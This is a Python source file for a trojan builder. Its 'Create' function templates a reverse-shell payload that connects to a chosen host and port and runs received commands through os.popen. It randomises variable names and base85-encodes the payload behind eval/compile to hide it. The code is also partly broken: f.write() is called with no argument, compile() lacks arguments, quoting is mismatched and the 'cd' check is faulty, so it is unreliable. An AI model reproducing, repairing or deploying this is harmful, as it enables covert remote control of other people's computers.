import colorama
import socket
from base64 import b85encode , b85decode 
def Create(*self, Host, Port, str1, str2, str3, str4, PATH):
    """Creates Reverse_Shell Trojan With Parameters"""
    from time import sleep as Sleep
    Red, Blue, Green, Reset = colorama.Fore.LIGHTRED_EX, colorama.Fore.LIGHTBLUE_EX, colorama.Fore.LIGHTGREEN_EX, colorama.Fore.RESET
    print("[" , Green + "!" + Reset + "]" + Reset +
          "Opening File To Write Data On It...", end = "")
    Sleep(0.2)
    try:
        f = open(PATH, "w+")
    except:
        print(
            "\r["+ Red + "-" + "]" + Reset + "Opening File To Write Data On It...Failed \n Cannnot Open File")
        Sleep(0.2)
        return False
    else:
        print("\r[" + Blue + "+" + Reset + "]" + Reset +
              "Opening File To Write Data On It...Done")
        Sleep(0.2)

    Trojan_Data = """

import socket 
import os 
import sys
{Connected} = False
while not {Connected} :
    try :
        {Connection} = socket.socket(socket.AF_INET , socket.SOCK_DGRAM)
        port = {p} 
        host = "{h}"
        {Connection}.connect((host , port)) 
        {Connected} = True 
    except :
        {Connected} = False
    while {Connected} :
        try : 
            {Connection}.send((sys.platform).encode('UTF-8'))
            {Command} = {Connection}.recv(1024).decode("UTF-8")
            if {Command}.strip().split() == "cd " :
                {Result} = os.chdir({Command}.strip('cd '))
            elif {Command}.strip().split() == "CD " :
                {Result} = os.chdir({Command}.strip('CD '))
            else :
                {Result} = os.popen({Command}).read()
                
            {Connection}.send({Result}.encode("UTF-8"))
        except :
            {Connected} = False
'''
                               """.format(Connected=str1, Connection=str2, Command=str3, Result=str4, h=Host, p=Port)
    from colorama import Fore
    Red , Blue , Green , Reset = Fore.LIGHTRED_EX, Fore.LIGHTBLUE_EX, Fore.LIGHTGREEN_EX, Fore.RESET
    from time import sleep as Sleep
    print("[" + Blue + "+" + Reset + "]" + Reset + "Encrypting Data Before Writing On File...\n")
    Trojan_data=str(b85encode(bytes(Trojan_Data, 'UTF-8')))
    Trojan_data= "value = '''\n" + Trojan_data + "\n'''\n"
    Trojan_data+='''
    value = bytes(value, 'UTF-8')
    script_data = b85decode(value)
    eval(compile(script_data.decode('UTF-8')))
    '''
    print("[" + Green + "!" + Reset + "]" + Reset + "Writing Data On File...", end="")
    try:
        f.write()
    except PermissionError:
        print("\r[" + Red + "-"+ Reset + "]"+ Reset + "Writing Data On File...Failed \nSomething Went Wrong . Looks Like "
              "You Dont Have Access To The File.")
    except:
        print("\r[" , Red + "-", "]"+ Reset + "Writing Data On File...Failed \nSomething Went Wrong . Is Another Process "
              "Using It ? ")
        Sleep(0.2)
        print("[" , Red + "-", "]" + Reset + "Couldnt Write Data On File Closing File...", end="")
        f.close()
        Sleep(0.2)
        print("Done")
    else:
        print("\r[" + Blue + "+" + Reset + "]" + Reset + "Writing Data On File...Done")
        print("[" + Blue + "+" + Reset + "]", Fore.RESET + "Succesfully Created Trojan")
        Sleep(1)

